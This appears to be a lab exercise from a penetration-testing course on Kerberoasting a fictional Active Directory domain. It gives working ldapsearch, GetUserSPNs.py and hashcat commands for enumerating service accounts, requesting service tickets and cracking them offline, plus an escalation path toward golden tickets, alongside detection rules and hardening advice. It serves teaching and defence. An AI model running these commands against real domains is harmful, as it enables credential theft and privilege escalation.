    Exercise 3.3: Kerberoast

    Before You Begin

    Kerberoast is the most reliable AD attack on the offensive checklist. Any authenticated domain user can request a service ticket (TGS-REP) for any account that has a Service Principal Name registered. The TGS-REP is encrypted with the service account's password-derived key. Weak password = crackable hash. The traffic looks identical to legitimate authentication; the SOC has no signal until the cracked password is used elsewhere.

    Exercise 3.3 asks you to find one Kerberoast-able service account in Nordport's directory and crack its TGS-REP. The recovered password is your flag.

    Tools required: impacket-GetUserSPNs (often GetUserSPNs.py), hashcat, ldapsearch. Pre-installed on Kali.

    Scenario

    Marcus Bell: "If a service account has an SPN, any authenticated domain user can ask the KDC for a service ticket. The ticket is encrypted with the service account's password hash. Quiet attack, totally normal-looking traffic."

    Per-student: svc_kerb_<token> has an SPN of the form MSSQLSvc/eng-build-NN.corp.nordport.local:1433. Crack its TGS-REP. The plaintext is the flag.

    Credentials:

    Username Password
    j.chen Welcome2026#

    Domain: corp.nordport.local

    Your Objectives

    • Enumerate accounts with registered SPNs
    • Request a TGS-REP for svc_kerb_<token>
    • Crack the TGS-REP with hashcat mode 13100
    • Submit the plaintext

    TGS-REP Hash Mode Lookup

    The mode you launch depends on the etype the KDC returned. The table below tells you which hashcat mode matches each prefix.

    TGS-REP prefix Etype Algorithm Hashcat mode
    $krb5tgs$23$ 23 RC4-HMAC 13100
    $krb5tgs$17$ 17 AES128 19600
    $krb5tgs$18$ 18 AES256 19700

    Background: SPNs and Why Service Tickets Are Crackable

    A Service Principal Name (SPN) is a string that identifies a service instance in the Kerberos namespace. The format is <service-class>/<host>[:port], for example MSSQLSvc/db01.corp.local:1433 or HTTP/web01.corp.local. When a client wants a ticket to talk to that service, it sends a TGS-REQ with that SPN as the sname; the KDC looks up which account is associated with the SPN, encrypts the service ticket with that account's password-derived key, and returns the ticket in the TGS-REP.

    Why this is attackable

    The KDC does not check whether the requesting user has any actual relationship to the service. Any authenticated domain user can request a TGS for any SPN. The KDC issues the TGS-REP. The ticket is encrypted with the service account's NT hash (or AES key). An attacker captures the TGS-REP, brute-forces the encryption offline, and recovers the service account password.

    The defender's only mitigation is strong service account passwords. Specifically:

    • Group Managed Service Accounts (gMSAs): Windows generates a 240-byte randomly-rotated password every 30 days. Cracking is computationally infeasible.
    • Standalone Managed Service Accounts (sMSAs): precursor to gMSAs, similar properties.
    • Long human-set passwords: 25+ characters with diverse character classes makes the hash impractical to crack in a useful timeframe.

    In practice, most environments have at least one weak service account password. SQL Server installations from circa 2010 used Password!23 patterns. SCCM agents used short fixed credentials. CI/CD service accounts often share a password reused for a decade.

    The TGS-REP hash format

    $krb5tgs$23$*svc_kerb_a7f3$CORP.NORDPORT.LOCAL$MSSQLSvc/eng-build-01.corp.nordport.local:1433*$<challenge>$<encrypted_blob>

    23 is RC4-HMAC. Hashcat mode is 13100. AES128 is etype 17 (mode 19600), AES256 is etype 18 (mode 19700); the prefix changes accordingly.

    The LDAP filter

    (&(samAccountType=805306368)(servicePrincipalName=*))

    samAccountType=805306368 is "user object." servicePrincipalName=* means "has at least one SPN." Computer objects have SPNs too (machine accounts) but their passwords are 240 random bytes and are not crackable; filtering on samAccountType=805306368 keeps the result list focused on user-level service accounts.

    Tool Primer

    LDAP enumeration

    ldapsearch -x -LLL -H ldap://<dc> \
  -D "CORP\j.chen" -w 'Welcome2026#' \
  -b "DC=corp,DC=nordport,DC=local" \
  "(&(samAccountType=805306368)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName

    GetUserSPNs.py

    Enumerate and request all in one shot:

    GetUserSPNs.py corp.nordport.local/j.chen:'Welcome2026#' -dc-ip <dc> -request \
  -outputfile tgs.hash

    Or target a specific user:

    GetUserSPNs.py corp.nordport.local/j.chen:'Welcome2026#' -dc-ip <dc> \
  -request-user "svc_kerb_<token>" -outputfile tgs.hash

    hashcat mode 13100

    hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

    For AES TGS-REPs, swap to -m 19600 or -m 19700. Modern DCs default to AES; RC4 cracking only works if the service account explicitly permits RC4 (msDS-SupportedEncryptionTypes allows it) or the domain default still allows it.

    Forcing RC4 (faster cracking)

    You can request the TGS with etype restricted to RC4:

    GetUserSPNs.py corp.nordport.local/j.chen:'Welcome2026#' -dc-ip <dc> \
  -request -outputfile tgs.hash
# GetUserSPNs.py defaults to RC4 when the account allows it; if you get AES anyway,
# set etype on the request manually with impacket scripts that expose the option.

    If the domain or account denies RC4, you get AES back and crack with the AES mode.

    Walkthrough

    Step 1: List All SPN-Bearing User Accounts

    The first move is to find every Kerberoast candidate the directory holds. The LDAP filter excludes computer accounts (whose passwords are 240 random bytes and uncrackable) and returns only the user-class accounts that have at least one SPN registered.

    Kali - Enumerate via LDAP

    ldapsearch -x -LLL -H ldap://<dc_ip> \
  -D "CORP\j.chen" -w 'Welcome2026#' \
  -b "DC=corp,DC=nordport,DC=local" \
  "(&(samAccountType=805306368)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName \
  | grep -E '^(sAMAccountName|servicePrincipalName)'
    Token Effect
    samAccountType=805306368 Filter to user-class objects only (computer accounts are 805306369).
    servicePrincipalName=* Has at least one SPN registered.
    sAMAccountName servicePrincipalName Trailing attribute list; only return these two.
    \| grep -E '^(sAMAccountName\|servicePrincipalName)' Filter LDIF to the two lines per record we care about.

    The output is a series of pairs: each user with their registered SPN(s). Find svc_kerb_<token>. The other students' service accounts also appear; ignore them.

    Step 2: Request the TGS

    GetUserSPNs.py authenticates as j.chen, requests a TGS for the named SPN, captures the TGS-REP, and formats it for hashcat in one step. The -request-user form is targeted; without it, the script requests TGSes for every SPN-bearing account it can see (loud on the wire, useful in real engagements where you do not yet know the target).

    Kali - Targeted TGS request

    mkdir -p ~/work/adpt-3-03 && cd ~/work/adpt-3-03
GetUserSPNs.py "corp.nordport.local/j.chen:Welcome2026#" \
  -dc-ip <dc_ip> \
  -request-user "svc_kerb_${OCR_SCOPE_TOKEN}" \
  -outputfile tgs.hash
cat tgs.hash
    Flag Effect
    <realm>/<user>:<pw> Authentication string in impacket format.
    -dc-ip <ip> Skip DNS for the KDC; use this IP directly.
    -request-user <name> Request a TGS only for this account; otherwise all SPN-bearing accounts.
    -outputfile tgs.hash Write hashcat-formatted hash to file.

    The file contains one line starting with $krb5tgs$. The number after the second $ is the etype: 23 = RC4-HMAC, 17 = AES128, 18 = AES256.

    Step 3: Crack with hashcat

    Hashcat mode 13100 is the RC4-HMAC TGS-REP mode. RC4 is the easiest target because each candidate password requires only one MD4 + HMAC-MD5 round (versus thousands of PBKDF2 iterations for AES). Modern domains often disable RC4; if your hash came back AES, switch to mode 19600 (AES128) or 19700 (AES256).

    Kali - Crack TGS-REP

    hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
    Flag Effect
    -m 13100 Kerberos 5 TGS-REP etype 23 (RC4).
    <hash_file> Hashcat reads one hash per line.
    <wordlist> rockyou.txt is the canonical first try.
    -r <rule> best64.rule applies 64 common mutations to each candidate.

    When done:

    hashcat -m 13100 tgs.hash --show

    The colon-separated last field is the plaintext.

    Step 4: Submit

    The plaintext IS the flag for this exercise. Wrap the recovered plaintext in OCR{...} and submit, so a recovered plaintext of <plaintext> becomes OCR{<plaintext>}.

    Common gotchas

    • AES-only environment: -m 13100 returns "no hashes loaded" if the hash starts with $krb5tgs$17$ or $krb5tgs$18$. Re-run with -m 19600 or -m 19700.
    • Clock skew: TGS-REQ requires a valid TGT, which fails if Kali's clock is more than 5 minutes off the DC. sudo chronyc -a 'burst 4/4' or sudo ntpdate <dc_ip> to sync.
    • No SPN configured: the seeded account has its SPN written by the setup script. If the ldapsearch returns no svc_kerb_<token>, the per-token seed never ran; check the Active Lab View status.
    • Quoting $ in zsh: ${OCR_SCOPE_TOKEN} works in bash and zsh, but $OCR_SCOPE_TOKEN (no braces) followed by _ glues the underscore into the name in some shells. Always brace.

    Blue Team Perspective

    The TGS-REQ itself is normal traffic. Detection lives in volume and etype anomalies on event 4769.

    Activity Event ID Field giveaway
    Service ticket issued 4769 Service Name per request
    RC4 forced for cracking 4769 Ticket Encryption Type = 0x17
    Bulk SPN enumeration 4769 burst many distinct Service Name per source IP
    Defender for Identity "Suspected Kerberoasting attack" MDI alert

    What the SOC sees in practice

    A normal user generates one or two distinct 4769 service names per day. An attacker batch-requesting every SPN in the directory generates dozens in seconds. SIEM rule: alert on more than 10 distinct service names per source identity per minute, or any 4769 with Ticket Encryption Type = 0x17 against an account whose msDS-SupportedEncryptionTypes should disallow RC4. Both rules are cheap and high-signal.

    Hardening Note

    The vulnerability is the password, not the protocol. Strong service-account secrets make the attack pointless even when the attack succeeds.

    Kerberoast hardening

    • Migrate every service account to a gMSA. Auto-rotated 240-byte passwords are computationally uncrackable.
    • For accounts that must remain user-mode, set passwords to 25+ random characters and document rotation cadence.
    • Disable RC4 forest-wide via GPO Network security: Configure encryption types allowed for Kerberos = AES128, AES256.
    • Set msDS-SupportedEncryptionTypes on every service account to disallow RC4.
    • SIEM detection on event 4769 with RC4 etype and on per-source request-volume spikes.
    • Inventory SPNs quarterly; remove SPNs from accounts that no longer host services.

    Analysis Questions

    1. The KDC issues a TGS for any SPN to any authenticated domain user. From a defender's perspective, is detection of Kerberoast possible at the network layer?

    Reveal Answer

    Detection at the network layer is hard because the TGS request itself is normal traffic. The signal lives in the volume and breadth of TGS requests from a single principal. A normal user requests TGSes for the few services they actually use over the day; an attacker requesting TGSes for every SPN in the directory generates a noticeable spike. Windows logs event 4769 (Kerberos service ticket request) on the DC; SIEMs can rule on "more than N distinct service names requested by the same source in a short window." Microsoft Defender for Identity and other ITDR products have built-in Kerberoast detections that combine 4769 volume with anomalous timing. The hardening control is to ensure the TGSes that are issued are AES (not RC4) and that the underlying account passwords are gMSA-rotated, so the cracked-hash phase becomes infeasible regardless of how many TGSes the attacker collects.

    2. Why are gMSAs effectively immune to Kerberoast cracking?

    Reveal Answer

    A gMSA's password is generated by the KDC as a 240-byte random value, automatically rotated every 30 days, and stored only on machines and accounts authorized to read it via the msDS-GroupMSAMembership attribute. Because the password is 240 bytes (1920 bits) of pure randomness, the search space is computationally infeasible: even at one billion guesses per second, you would need on the order of 10^570 years to brute-force one password, and the password rotates every month. Kerberoast TGS-REPs against gMSA accounts can still be requested, but the resulting hash is uncrackable in any meaningful timeframe. The mitigation is not to block the request; it is to make the resulting hash not worth cracking. Migrating service accounts to gMSAs is the single most effective Kerberoast mitigation.

    3. The TGS-REP is encrypted with the service account's password-derived key. The TGT (issued in the AS-REP) is encrypted with the krbtgt key. If you crack a service account's password via Kerberoast, can you forge silver tickets, golden tickets, both, or neither?

    Reveal Answer

    Cracking a service account's password via Kerberoast yields the password (or its derived NT hash). With that hash you can forge silver tickets for that specific service, because silver tickets are TGS-REPs encrypted with the service account's key and you now possess that key. You cannot forge golden tickets because those require the krbtgt account's hash, which you do not have. The progression is: Kerberoast a service account -> forge silver tickets to that service indefinitely -> potentially escalate to a Domain Admin who logs into that service -> dump krbtgt from a DC -> forge golden tickets across the entire domain. Kerberoast is rarely the final step in a chain; it is usually a first or middle step toward higher privilege.

    Key Takeaways

    • Any authenticated domain user can request a TGS-REP for any registered SPN.
    • The TGS-REP is encrypted with the service account's key; weak passwords crack offline.
    • Hashcat mode 13100 (RC4) or 19600/19700 (AES variants).
    • LDAP filter (&(samAccountType=805306368)(servicePrincipalName=*)) finds candidates.
    • gMSAs make cracking infeasible. Migrate service accounts.

    Cheat Sheet Recap

    The four operations below are the entire Kerberoast loop. Run them on every engagement; the attack still works in 2026.

    Targeted TGS request GetUserSPNs.py "<domain>/<u>:<pw>" -dc-ip <dc> -request-user "<svc>" -outputfile tgs.hash
    Crack TGS-REP hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

    Spaced Repetition

    Card 1: TGS-REP Hashcat Mode

    Q: What hashcat mode cracks $krb5tgs$23$?

    Answer

    Mode 13100 for RC4-HMAC. Mode 19600 for AES128 ($krb5tgs$17$). Mode 19700 for AES256 ($krb5tgs$18$). Modern domains default to AES; RC4 mode only works if the account or domain still permits RC4.

    Card 2: GetUserSPNs Targeted Request

    Q: Write the GetUserSPNs.py command to request a TGS for svc_app01 only against corp.local at 10.10.10.10 using j.smith / Pass#, writing to tgs.hash.

    Answer 
    GetUserSPNs.py "corp.local/j.smith:Pass#" \
  -dc-ip 10.10.10.10 \
  -request-user "svc_app01" \
  -outputfile tgs.hash

    Drop -request-user to request TGSes for every SPN-bearing account in one batch.

    Card 3: LDAP Filter for SPNs

    Q: Write the LDAP filter that returns user-class accounts with at least one SPN.

    Answer 
    (&(samAccountType=805306368)(servicePrincipalName=*))

    samAccountType=805306368 selects user objects (excluding computer accounts which have SPNs but uncrackable passwords). The * matches any SPN.

    Card 4: gMSA as Mitigation

    Q: Explain in two sentences why migrating service accounts to gMSAs makes Kerberoast practically irrelevant.

    Answer

    A gMSA password is 240 random bytes (1920 bits) automatically rotated every 30 days; the cracking search space is computationally infeasible regardless of TGS-REP volume. Attackers can still request the TGS-REP, but the resulting hash is uncrackable in any useful timeframe, so the attack chain stalls before the credential-recovery step.

    Card 5: Silver vs Golden Ticket from Kerberoast

    Q: A successful Kerberoast yields a service account's password. Which forged ticket types can you now produce?

    Answer

    Silver tickets only. Silver tickets are TGS-REPs encrypted with the service account's own key (which you now have). Golden tickets require the krbtgt hash, which you do not have. Silver tickets work indefinitely against the cracked service until the password rotates. They are useful for persistence and for accessing data the service holds.
